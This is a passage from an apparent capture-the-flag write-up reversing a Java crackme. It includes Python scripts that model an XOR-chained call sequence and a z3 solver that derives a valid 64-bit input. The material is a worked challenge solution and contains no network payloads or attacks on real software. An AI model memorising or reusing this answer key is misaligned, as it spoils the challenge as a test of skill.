class="number">127</span>) &amp; <span class="number">0xFFFF</span>  </span><br></pre></td></tr></table></figure><p>So, It monitors the execution flow and depends on the callee function. And later converts it to a utf-8 string and stores it into a static variable <strong><code>fun</code></strong>.<br>It passes the integer result xored with a specific value as an argument to the method called as a result of invokedynamic.  </p><p>All the other methods are mostly similar to this except that they differ in this xor operand value.<br>For extracting those, we can just use a simple regex. Also for 127 we can just fake it with a 0.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">filedata = <span class="built_in">open</span>(<span class="string">&quot;jeb_decompiled_code.java&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">desired_lines1, desired_lines2 = filedata[<span class="number">0</span>::<span class="number">10</span>], filedata[<span class="number">7</span>::<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(desired_lines1, desired_lines2):</span><br><span class="line">    x = re.search(<span class="string">r&quot;Object (.*)\(Object&quot;</span>, x).group(<span class="number">1</span>)</span><br><span class="line">    y = re.search(<span class="string">r&quot;\(new Object\[\]\&#123;\(\(int\)\(v5 \^ (.*)\)\)\&#125;\);&quot;</span>, y).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0x&#x27;</span> <span class="keyword">in</span> y:</span><br><span class="line">        y = <span class="built_in">int</span>(y,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> x,<span class="string">&quot;:&quot;</span>,y</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Thread.currentThread().getStackTrace().length &gt; <span class="number">127</span>)</span><br></pre></td></tr></table></figure><p>We see that it checks if the no. of functions executed in a run is greater than 127 it returns true which should then validate out input.<br>Perfect this is all we need to know to write a short python script.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">nice_fcns = [<span class="number">0</span>,<span class="number">63</span>,<span class="number">127</span>,<span class="number">255</span>,<span class="number">462</span>,<span class="number">740</span>,<span class="number">896</span>,<span class="number">1217</span>,<span class="number">1721</span>,<span class="number">1914</span>,<span class="number">2457</span>,<span class="number">2697</span>,<span class="number">3300</span>,<span class="number">3994</span>,<span class="number">4535</span>,<span class="number">4647</span>,<span class="number">5078</span>,<span class="number">5256</span>,<span class="number">5311</span>,<span class="number">5594</span>,<span class="number">5680</span>,<span class="number">5751</span>,<span class="number">6139</span>,<span class="number">6273</span>,<span class="number">6544</span>,<span class="number">6640</span>,<span class="number">6740</span>,<span class="number">6866</span>,<span class="number">6956</span>,<span class="number">7039</span>,<span class="number">7127</span>,<span class="number">7205</span>,<span class="number">7334</span>,<span class="number">8392</span>,<span class="number">8489</span>,<span class="number">8591</span>,<span class="number">8963</span>,<span class="number">9828</span>,<span class="number">10245</span>,<span class="number">10310</span>,<span class="number">10359</span>,<span class="number">11024</span>,<span class="number">11208</span>,<span class="number">11394</span>,<span class="number">11775</span>,<span class="number">12009</span>,<span class="number">12071</span>,<span class="number">12505</span>,<span class="number">12531</span>,<span class="number">12689</span>,<span class="number">13158</span>,<span class="number">13529</span>,<span class="number">13910</span>,<span class="number">13946</span>,<span class="number">14071</span>,<span class="number">14256</span>,<span class="number">14643</span>,<span class="number">14981</span>,<span class="number">15004</span>,<span class="number">15021</span>,<span class="number">15170</span>,<span class="number">15725</span>,<span class="number">15889</span>,<span class="number">15903</span>,<span class="number">15999</span>,<span class="number">16632</span>,<span class="number">17038</span>,<span class="number">17270</span>,<span class="number">17362</span>,<span class="number">17470</span>,<span class="number">17594</span>,<span class="number">18318</span>,<span class="number">18415</span>,<span class="number">18642</span>,<span class="number">18809</span>,<span class="number">18943</span>,<span class="number">19300</span>,<span class="number">19493</span>,<span class="number">19699</span>,<span class="number">19813</span>,<span class="number">20069</span>,<span class="number">20753</span>,<span class="number">21238</span>,<span class="number">21380</span>,<span class="number">21522</span>,<span class="number">21855</span>,<span class="number">21867</span>,<span class="number">22095</span>,<span class="number">22909</span>,<span class="number">22966</span>,<span class="number">23046</span>,<span class="number">23167</span>,<span class="number">23469</span>,<span class="number">23651</span>,<span class="number">23762</span>,<span class="number">23979</span>,<span class="number">24112</span>,<span class="number">24303</span>,<span class="number">24352</span>,<span class="number">24395</span>,<span class="number">24440</span>,<span class="number">25087</span>,<span class="number">25167</span>,<span class="number">25366</span>,<span class="number">25592</span>,<span class="number">25895</span>,<span class="number">26142</span>,<span class="number">26206</span>,<span class="number">26442</span>,<span class="number">26746</span>,<span class="number">27153</span>,<span class="number">27647</span>,<span class="number">27728</span>,<span class="number">27903</span>,<span class="number">28356</span>,<span class="number">28537</span>,<span class="number">29070</span>,<span class="number">29177</span>,<span class="number">29329</span>,<span class="number">29648</span>,<span class="number">29760</span>,<span class="number">30695</span>,<span class="number">30827</span>,<span class="number">31246</span>,<span class="number">31314</span>,<span class="number">31533</span>,<span class="number">31709</span>,<span class="number">31797</span>,<span class="number">32014</span>,<span class="number">32263</span>,<span class="number">32384</span>,<span class="number">32681</span>,<span class="number">32815</span>,<span class="number">32896</span>,<span class="number">32937</span>,<span class="number">33201</span>,<span class="number">33323</span>,<span class="number">33467</span>,<span class="number">33511</span>,<span class="number">34315</span>,<span class="number">34374</span>,<span class="number">35511</span>,<span class="number">35812</span>,<span class="number">36141</span>,<span class="number">36234</span>,<span class="number">36256</span>,<span class="number">36382</span>,<span class="number">36556</span>,<span class="number">37137</span>,<span class="number">37298</span>,<span class="number">37790</span>,<span class="number">37918</span>,<span class="number">37995</span>,<span class="number">38143</span>,<span class="number">38435</span>,<span class="number">38867</span>,<span class="number">38940</span>,<span class="number">38974</span>,<span class="number">39041</span>,<span class="number">39108</span>,<span class="number">39166</span>,<span class="number">39309</span>,<span class="number">40355</span>,<span class="number">40726</span>,<span class="number">40791</span>,<span class="number">40986</span>,<span class="number">41166</span>,<span class="number">41503</span>,<span class="number">42447</span>,<span class="number">42534</span>,<span class="number">42704</span>,<span class="number">43135</span>,<span class="number">43263</span>,<span class="number">43521</span>,<span class="number">43557</span>,<span class="number">43730</span>,<span class="number">43779</span>,<span class="number">44178</span>,<span class="number">44677</span>,<span class="number">44734</span>,<span class="number">44797</span>,<span class="number">44943</span>,<span class="number">45007</span>,<span class="number">45966</span>,<span class="number">46337</span>,<span class="number">46396</span>,<span class="number">46528</span>,<span class="number">46979</span>,<span class="number">47000</span>,<span class="number">47533</span>,<span class="number">47846</span>,<span class="number">47921</span>,<span class="number">47948</span>,<span class="number">48207</span>,<span class="number">48557</span>,<span class="number">48726</span>,<span class="number">48975</span>,<span class="number">48996</span>,<span class="number">49636</span>,<span class="number">49667</span>,<span class="number">50383</span>,<span class="number">51030</span>,<span class="number">51358</span>,<span class="number">51578</span>,<span class="number">51583</span>,<span class="number">51692</span>,<span class="number">51702</span>,<span class="number">52032</span>,<span class="number">52101</span>,<span class="number">52184</span>,<span class="number">52396</span>,<span class="number">52500</span>,<span class="number">52530</span>,<span class="number">52538</span>,<span class="number">52556</span>,<span class="number">52931</span>,<span class="number">53184</span>,<span class="number">53275</span>,<span class="number">53324</span>,<span class="number">53564</span>,<span class="number">53774</span>,<span class="number">53887</span>,<span class="number">54212</span>,<span class="number">54764</span>,<span class="number">55039</span>,<span class="number">55295</span>,<span class="number">55342</span>,<span class="number">55359</span>,<span class="number">55375</span>,<span class="number">55774</span>,<span class="number">55938</span>,<span class="number">56138</span>,<span class="number">56452</span>,<span class="number">56564</span>,<span class="number">56816</span>,<span class="number">57016</span>,<span class="number">57107</span>,<span class="number">57508</span>,<span class="number">57569</span>,<span class="number">57611</span>,<span class="number">57779</span>,<span class="number">57796</span>,<span class="number">58153</span>,<span class="number">59099</span>,<span class="number">59380</span>,<span class="number">59406</span>,<span class="number">59575</span>,<span class="number">59829</span>,<span class="number">59875</span>,<span class="number">60282</span>,<span class="number">60756</span>,<span class="number">61041</span>,<span class="number">61087</span>,<span class="number">61428</span>,<span class="number">61495</span>,<span class="number">61565</span>,<span class="number">61664</span>,<span class="number">61703</span>,<span class="number">61839</span>,<span class="number">62288</span>,<span class="number">62561</span>,<span class="number">62614</span>,<span class="number">62719</span>,<span class="number">62991</span>,<span class="number">63231</span>,<span class="number">63256</span>,<span class="number">63670</span>,<span class="number">63882</span>,<span class="number">64009</span>,<span class="number">64051</span>,<span class="number">64127</span>,<span class="number">64191</span>,<span class="number">64625</span>,<span class="number">64934</span>,<span class="number">65018</span>,<span class="number">65155</span>,]</span><br><span class="line">xor_values_map = &#123;<span class="number">0</span> : <span class="number">64</span>, <span class="number">10245</span> : <span class="number">48</span>, <span class="number">10310</span> : <span class="number">244</span>, <span class="number">10359</span> : <span class="number">160</span>, <span class="number">11024</span> : <span class="number">56</span>, <span class="number">11208</span> : <span class="number">24</span>, <span class="number">11394</span> : <span class="number">200</span>, <span class="number">11775</span> : <span class="number">236</span>, <span class="number">12009</span> : <span class="number">32</span>, <span class="number">12071</span> : <span class="number">156</span>, <span class="number">1217</span> : <span class="number">36</span>, <span class="number">12505</span> : <span class="number">220</span>, <span class="number">12531</span> : <span class="number">56</span>, <span class="number">12689</span> : <span class="number">168</span>, <span class="number">127</span> : <span class="number">0</span>, <span class="number">13158</span> : <span class="number">184</span>, <span class="number">13529</span> : <span class="number">24</span>, <span class="number">13910</span> : <span class="number">168</span>, <span class="number">13946</span> : <span class="number">92</span>, <span class="number">14071</span> : <span class="number">36</span>, <span class="number">14256</span> : <span class="number">192</span>, <span class="number">14643</span> : <span class="number">184</span>, <span class="number">14981</span> : <span class="number">132</span>, <span class="number">15004</span> : <span class="number">192</span>, <span class="number">15021</span> : <span class="number">20</span>, <span class="number">15170</span> : <span class="number">232</span>, <span class="number">15725</span> : <span class="number">40</span>, <span class="number">15889</span> : <span class="number">108</span>, <span class="number">15903</span> : <span class="number">160</span>, <span class="number">15999</span> : <span class="number">236</span>, <span class="number">16632</span> : <span class="number">192</span>, <span class="number">17038</span> : <span class="number">132</span>, <span class="number">1721</span> : <span class="number">44</span>, <span class="number">17270</span> : <span class="number">44</span>, <span class="number">17362</span> : <span class="number">156</span>, <span class="number">17470</span> : <span class="number">164</span>, <span class="number">17594</span> : <span class="number">216</span>, <span class="number">18318</span> : <span class="number">244</span>, <span class="number">18415</span> : <span class="number">124</span>, <span class="number">18642</span> : <span class="number">12</span>, <span class="number">18809</span> : <span class="number">152</span>, <span class="number">18943</span> : <span class="number">252</span>, <span class="number">1914</span> : <span class="number">20</span>, <span class="number">19300</span> : <span class="number">20</span>, <span class="number">19493</span> : <span class="number">232</span>, <span class="number">19699</span> : <span class="number">200</span>, <span class="number">19813</span> : <span class="number">184</span>, <span class="number">20069</span> : <span class="number">236</span>, <span class="number">20753</span> : <span class="number">228</span>, <span class="number">21238</span> : <span class="number">32</span>, <span class="number">21380</span> : <span class="number">208</span>, <span class="number">21522</span> : <span class="number">40</span>, <span class="number">21855</span> : <span class="number">220</span>, <span class="number">21867</span> : <span class="number">24</span>, <span class="number">22095</span> : <span class="number">208</span>, <span class="number">22909</span> : <span class="number">120</span>, <span class="number">22966</span> : <span class="number">220</span>, <span class="number">23046</span> : <span class="number">124</span>, <span class="number">23167</span> : <span class="number">124</span>, <span class="number">23469</span> : <span class="number">40</span>, <span class="number">23651</span> : <span class="number">252</span>, <span class="number">23762</span> : <span class="number">56</span>, <span class="number">23979</span> : <span class="number">152</span>, <span class="number">24112</span> : <span class="number">192</span>, <span class="number">24303</span> : <span class="number">48</span>, <span class="number">24352</span> : <span class="number">72</span>, <span class="number">24395</span> : <span class="number">140</span>, <span class="number">24440</span> : <span class="number">200</span>, <span class="number">2457</span> : <span class="number">112</span>, <span class="number">25087</span> : <span class="number">208</span>, <span class="number">25167</span> : <span class="number">4</span>, <span class="number">25366</span> : <span class="number">192</span>, <span class="number">255</span> : <span class="number">56</span>, <span class="number">25592</span> : <span class="number">148</span>, <span class="number">25895</span> : <span class="number">252</span>, <span class="number">26142</span> : <span class="number">148</span>, <span class="number">26206</span> : <span class="number">48</span>, <span class="number">26442</span> : <span class="number">200</span>, <span class="number">26746</span> : <span class="number">236</span>, <span class="number">2697</span> : <span class="number">248</span>, <span class="number">27153</span> : <span class="number">216</span>, <span class="number">27647</span> : <span class="number">176</span>, <span class="number">27728</span> : <span class="number">160</span>, <span class="number">27903</span> : <span class="number">228</span>, <span class="number">28356</span> : <span class="number">72</span>, <span class="number">28537</span> : <span class="number">244</span>, <span class="number">29070</span> : <span class="number">248</span>, <span class="number">29177</span> : <span class="number">216</span>, <span class="number">29329</span> : <span class="number">244</span>, <span class="number">29648</span> : <span class="number">244</span>, <span class="number">29760</span> : <span class="number">88</span>, <span class="number">30695</span> : <span class="number">108</span>, <span class="number">30827</span> : <span class="number">0</span>, <span class="number">31246</span> : <span class="number">40</span>, <span class="number">31314</span> : <span class="number">32</span>, <span class="number">31533</span> : <span class="number">100</span>, <span class="number">31709</span> : <span class="number">248</span>, <span class="number">31797</span> : <span class="number">100</span>, <span class="number">32014</span> : <span class="number">176</span>, <span class="number">32263</span> : <span class="number">64</span>, <span class="number">32384</span> : <span class="number">64</span>, <span class="number">32681</span> : <span class="number">64</span>, <span class="number">32815</span> : <span class="number">76</span>, <span class="number">32896</span> : <span class="number">40</span>, <span class="number">32937</span> : <span class="number">8</span>, <span class="number">3300</span> : <span class="number">128</span>, <span class="number">33201</span> : <span class="number">244</span>, <span class="number">33323</span> : <span class="number">176</span>, <span class="number">33467</span> : <span class="number">108</span>, <span class="number">33511</span> : <span class="number">236</span>, <span class="number">34315</span> : <span class="number">40</span>, <span class="number">34374</span> : <span class="number">4</span>, <span class="number">35511</span> : <span class="number">116</span>, <span class="number">35812</span> : <span class="number">100</span>, <span class="number">36141</span> : <span class="number">148</span>, <span class="number">36234</span> : <span class="number">192</span>, <span class="number">36256</span> : <span class="number">192</span>, <span class="number">36382</span> : <span class="number">216</span>, <span class="number">36556</span> : <span class="number">244</span>, <span class="number">37137</span> : <span class="number">252</span>, <span class="number">37298</span> : <span class="number">12</span>, <span class="number">37790</span> : <span class="number">216</span>, <span class="number">37918</span> : <span class="number">16</span>, <span class="number">37995</span> : <span class="number">252</span>, <span class="number">38143</span> : <span class="number">148</span>, <span class="number">38435</span> : <span class="number">124</span>, <span class="number">38867</span> : <span class="number">48</span>, <span class="number">38940</span> : <span class="number">64</span>, <span class="number">38974</span> : <span class="number">124</span>, <span class="number">39041</span> : <span class="number">36</span>, <span class="number">39108</span> : <span class="number">244</span>, <span class="number">39166</span> : <span class="number">20</span>, <span class="number">39309</span> : <span class="number">40</span>, <span class="number">3994</span> : <span class="number">188</span>, <span class="number">40355</span> : <span class="number">228</span>, <span class="number">40726</span> : <span class="number">68</span>, <span class="number">40791</span> : <span class="number">244</span>, <span class="number">40986</span> : <span class="number">84</span>, <span class="number">41166</span> : <span class="number">176</span>, <span class="number">41503</span> : <span class="number">212</span>, <span class="number">42447</span> : <span class="number">220</span>, <span class="number">42534</span> : <span class="number">160</span>, <span class="number">42704</span> : <span class="number">204</span>, <span class="number">43135</span> : <span class="number">48</span>, <span class="number">43263</span> : <span class="number">192</span>, <span class="number">43521</span> : <span class="number">108</span>, <span class="number">43557</span> : <span class="number">32</span>, <span class="number">43730</span> : <span class="number">236</span>, <span class="number">43779</span> : <span class="number">152</span>, <span class="number">44178</span> : <span class="number">56</span>, <span class="number">44677</span> : <span class="number">40</span>, <span class="number">44734</span> : <span class="number">160</span>, <span class="number">44797</span> : <span class="number">108</span>, <span class="number">44943</span> : <span class="number">32</span>, <span class="number">45007</span> : <span class="number">40</span>, <span class="number">4535</span> : <span class="number">180</span>, <span class="number">45966</span> : <span class="number">160</span>, <span class="number">462</span> : <span class="number">64</span>, <span class="number">46337</span> : <span class="number">108</span>, <span class="number">46396</span> : <span class="number">72</span>, <span class="number">4647</span> : <span class="number">172</span>, <span class="number">46528</span> : <span class="number">220</span>, <span class="number">46979</span> : <span class="number">92</span>, <span class="number">47000</span> : <span class="number">140</span>, <span class="number">47533</span> : <span class="number">184</span>, <span class="number">47846</span> : <span class="number">228</span>, <span class="number">47921</span> : <span class="number">108</span>, <span class="number">47948</span> : <span class="number">24</span>, <span class="number">48207</span> : <span class="number">236</span>, <span class="number">48557</span> : <span class="number">244</span>, <span class="number">48726</span> : <span class="number">100</span>, <span class="number">48975</span> : <span class="number">244</span>, <span class="number">48996</span> : <span class="number">56</span>, <span class="number">49636</span> : <span class="number">48</span>, <span class="number">49667</span> : <span class="number">56</span>, <span class="number">50383</span> : <span class="number">116</span>, <span class="number">5078</span> : <span class="number">16</span>, <span class="number">51030</span> : <span class="number">252</span>, <span class="number">51358</span> : <span class="number">152</span>, <span class="number">51578</span> : <span class="number">152</span>, <span class="number">51583</span> : <span class="number">176</span>, <span class="number">51692</span> : <span class="number">116</span>, <span class="number">51702</span> : <span class="number">76</span>, <span class="number">52032</span> : <span class="number">56</span>, <span class="number">52101</span> : <span class="number">236</span>, <span class="number">52184</span> : <span class="number">64</span>, <span class="number">52396</span> : <span class="number">244</span>, <span class="number">52500</span> : <span class="number">32</span>, <span class="number">52530</span> : <span class="number">108</span>, <span class="number">52538</span> : <span class="number">76</span>, <span class="number">52556</span> : <span class="number">92</span>, <span class="number">5256</span> : <span class="number">136</span>, <span class="number">52931</span> : <span class="number">24</span>, <span class="number">5311</span> : <span class="number">136</span>, <span class="number">53184</span> : <span class="number">4</span>, <span class="number">53275</span> : <span class="number">184</span>, <span class="number">53324</span> : <span class="number">228</span>, <span class="number">53564</span> : <span class="number">108</span>, <span class="number">53774</span> : <span class="number">168</span>, <span class="number">53887</span> : <span class="number">92</span>, <span class="number">54212</span> : <span class="number">176</span>, <span class="number">54764</span> : <span class="number">168</span>, <span class="number">55039</span> : <span class="number">168</span>, <span class="number">55295</span> : <span class="number">200</span>, <span class="number">55342</span> : <span class="number">124</span>, <span class="number">55359</span> : <span class="number">100</span>, <span class="number">55375</span> : <span class="number">252</span>, <span class="number">55774</span> : <span class="number">48</span>, <span class="number">55938</span> : <span class="number">136</span>, <span class="number">5594</span> : <span class="number">84</span>, <span class="number">56138</span> : <span class="number">108</span>, <span class="number">56452</span> : <span class="number">192</span>, <span class="number">56564</span> : <span class="number">184</span>, <span class="number">5680</span> : <span class="number">92</span>, <span class="number">56816</span> : <span class="number">144</span>, <span class="number">57016</span> : <span class="number">116</span>, <span class="number">57107</span> : <span class="number">40</span>, <span class="number">57508</span> : <span class="number">212</span>, <span class="number">5751</span> : <span class="number">136</span>, <span class="number">57569</span> : <span class="number">40</span>, <span class="number">57611</span> : <span class="number">48</span>, <span class="number">57779</span> : <span class="number">100</span>, <span class="number">57796</span> : <span class="number">184</span>, <span class="number">58153</span> : <span class="number">208</span>, <span class="number">59099</span> : <span class="number">80</span>, <span class="number">59380</span> : <span class="number">36</span>, <span class="number">59406</span> : <span class="number">40</span>, <span class="number">59575</span> : <span class="number">132</span>, <span class="number">59829</span> : <span class="number">212</span>, <span class="number">59875</span> : <span class="number">184</span>, <span class="number">60282</span> : <span class="number">184</span>, <span class="number">60756</span> : <span class="number">8</span>, <span class="number">61041</span> : <span class="number">56</span>, <span class="number">61087</span> : <span class="number">176</span>, <span class="number">6139</span> : <span class="number">60</span>, <span class="number">61428</span> : <span class="number">196</span>, <span class="number">61495</span> : <span class="number">236</span>, <span class="number">61565</span> : <span class="number">92</span>, <span class="number">61664</span> : <span class="number">92</span>, <span class="number">61703</span> : <span class="number">196</span>, <span class="number">61839</span> : <span class="number">52</span>, <span class="number">62288</span> : <span class="number">168</span>, <span class="number">62561</span> : <span class="number">48</span>, <span class="number">62614</span> : <span class="number">76</span>, <span class="number">62719</span> : <span class="number">180</span>, <span class="number">6273</span> : <span class="number">160</span>, <span class="number">62991</span> : <span class="number">108</span>, <span class="number">63</span> : <span class="number">204</span>, <span class="number">63231</span> : <span class="number">116</span>, <span class="number">63256</span> : <span class="number">168</span>, <span class="number">63670</span> : <span class="number">184</span>, <span class="number">63882</span> : <span class="number">108</span>, <span class="number">64009</span> : <span class="number">84</span>, <span class="number">64051</span> : <span class="number">72</span>, <span class="number">64127</span> : <span class="number">32</span>, <span class="number">64191</span> : <span class="number">20</span>, <span class="number">64625</span> : <span class="number">84</span>, <span class="number">64934</span> : <span class="number">144</span>, <span class="number">65018</span> : <span class="number">32</span>, <span class="number">65155</span> : <span class="number">184</span>, <span class="number">6544</span> : <span class="number">68</span>, <span class="number">6640</span> : <span class="number">16</span>, <span class="number">6740</span> : <span class="number">204</span>, <span class="number">6866</span> : <span class="number">120</span>, <span class="number">6956</span> : <span class="number">112</span>, <span class="number">7039</span> : <span class="number">68</span>, <span class="number">7127</span> : <span class="number">196</span>, <span class="number">7205</span> : <span class="number">128</span>, <span class="number">7334</span> : <span class="number">204</span>, <span class="number">740</span> : <span class="number">116</span>, <span class="number">8392</span> : <span class="number">176</span>, <span class="number">8489</span> : <span class="number">204</span>, <span class="number">8591</span> : <span class="number">108</span>, <span class="number">896</span> : <span class="number">108</span>, <span class="number">8963</span> : <span class="number">136</span>, <span class="number">9828</span> : <span class="number">44</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hashcode</span>(<span class="params">s</span>):</span></span><br><span class="line">    s = <span class="built_in">str</span>(s)</span><br><span class="line">    n = <span class="built_in">len</span>(s)</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        res += <span class="built_in">ord</span>(s[i])*<span class="number">31</span>**(n-(i+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    visited = [<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#init with call to fcn_0</span></span><br><span class="line">    v5 = (( get_hashcode(<span class="string">&#x27;main&#x27;</span>) * arg) * <span class="number">0x7FFF</span> &lt;&lt; <span class="number">3</span> | <span class="number">127</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">if</span> v5 <span class="keyword">in</span> nice_fcns:</span><br><span class="line">        <span class="built_in">print</span> arg,<span class="string">&quot;: END @&quot;</span>,</span><br><span class="line">        visited.append(v5)</span><br><span class="line">        arg = v5 ^ xor_values_map[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#print &quot;Not eligible !!&quot;</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        v5 = (( get_hashcode(visited[-<span class="number">2</span>]) * arg) * <span class="number">0x7FFF</span> &lt;&lt; <span class="number">3</span> | <span class="number">127</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v5 <span class="keyword">in</span> nice_fcns:</span><br><span class="line">            arg = v5 ^ xor_values_map[visited[-<span class="number">1</span>]]</span><br><span class="line">            visited.append(v5)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> v5</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;len(stackTrace) = &quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(visited)+<span class="number">2</span>),visited)</span><br></pre></td></tr></table></figure><p>Here we check for maximum length of stacktrace which can be achieved and to my surprise it was 22!<br>Also there are 3 results(191,465,739) with the same stacktrace which ends at 7039.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;len(stackTrace) = 22&#x27;</span>, [<span class="number">0</span>, <span class="number">55295L</span>, <span class="number">25087L</span>, <span class="number">255L</span>, <span class="number">15999L</span>, <span class="number">64127L</span>, <span class="number">63231L</span>, <span class="number">11775L</span>, <span class="number">23167L</span>, <span class="number">62719L</span>, <span class="number">43135L</span>, <span class="number">27647L</span>, <span class="number">18943L</span>, <span class="number">38143L</span>, <span class="number">51583L</span>, <span class="number">53887L</span>, <span class="number">27903L</span>, <span class="number">55039L</span>, <span class="number">43263L</span>, <span class="number">7039L</span>])</span><br></pre></td></tr></table></figure><p>Then I moved on and wrote used z3 to find the exact 64 bit integer which results in those 3 digit values. Note the operations on the input.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">inp = BitVec(<span class="string">&#x27;inp&#x27;</span>,<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">res1 = ((inp &gt;&gt; <span class="number">24</span> &amp; <span class="number">15</span> | (inp &gt;&gt; <span class="number">56</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>)&amp; <span class="number">0xFF</span>)</span><br><span class="line">res2 = ((inp &gt;&gt; <span class="number">8</span> &amp; <span class="number">15</span> | (inp &gt;&gt; <span class="number">40</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>)&amp; <span class="number">0xFF</span>)</span><br><span class="line">res3 = ((inp &gt;&gt; <span class="number">0</span> &amp; <span class="number">15</span> | (inp &gt;&gt; <span class="number">0x20</span> &amp; <span class="number">15</span>) &lt;&lt; <span class="number">4</span>)&amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">s.add(And(res1 &gt;= <span class="number">48</span>,res1 &lt;= <span class="number">57</span>))</span><br><span class="line">s.add(And(res2 &gt;= <span class="number">48</span>,res2 &lt;= <span class="number">57</span>))</span><br><span class="line">s.add(And(res3 &gt;= <span class="number">48</span>,res3 &lt;= <span class="number">57</span>))</span><br><span class="line"></span><br><span class="line">got = (res1-<span class="number">48</span>)*<span class="number">100</span> + (res2-<span class="number">48</span>)*<span class="number">10</span> + (res3-<span class="number">48</span>)</span><br><span class="line"><span class="comment">#got can be : 191, 465, 739</span></span><br><span class="line"></span><br><span class="line">s.add(got == <span class="number">191</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> s.check()</span><br><span class="line"><span class="built_in">print</span> s.model()</span><br><span class="line"><span class="comment"># Multiple solutions possible</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">while s.check() == sat:</span></span><br><span class="line"><span class="string">solution = s.model()</span></span><br><span class="line"><span class="string">block = []</span></span><br><span class="line"><span class="string">c = inp</span></span><br><span class="line"><span class="string">print solution[c] </span></span><br><span class="line"><span class="string">block.append(c != solution[c])</span></span><br><span class="line"><span class="string">s.add(Or(block))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>But indeed it validated successfully !!  </p><p><a href="/img/noverify/solved.PNG"><a href="/img/noverify/solved.PNG" title="solved" class="gallery-item"><img src="/img/noverify/solved.PNG" alt="solved"></a></a>  </p><a href="https://media.giphy.com/media/kHmBzIxx4LRSM/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/kHmBzIxx4LRSM/giphy.gif" alt="drawing" width="300"/></a>  <hr><h1 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h1><p><strong><em>So, what did I miss?</em></strong> </p><p>I wanted to check what was going under the hood and tried some debuggers like jdb(didn’t work).<br>Also I came across <a href="http://drgarbagetools.sourceforge.net/">Dr Garbage Tool’s</a> Bytecode Visualizer.<br>This is an old eclipse plugin set and doesn’t work with newer versions of eclipse.  